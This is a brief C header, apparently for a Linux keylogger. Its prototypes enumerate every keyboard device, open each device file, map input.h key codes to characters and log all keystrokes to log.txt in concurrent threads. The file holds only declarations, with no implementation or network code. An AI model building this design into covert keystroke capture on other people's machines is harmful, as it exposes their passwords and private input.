#ifndef KBDEVENTS_HEADER
#define KBDEVENTS_HEADER

    /**
     * Maps linux input.h keys to character data
     */
    void logger_init();

   
    #define MAX_INPUT_DEVICES 20
    #define MAX_FILE_PATH 255
     /**
     * finds all the keyboard devices on this machine and stores their device files
     */
    void find_keyboards();

    /**
     * opens the device file for each keyboard
     */
    void open_keyboards();
    
    /**
     * creates a thread to read each file concurrently and writes the output to log.txt
     */
    void read_keyboards();

#endif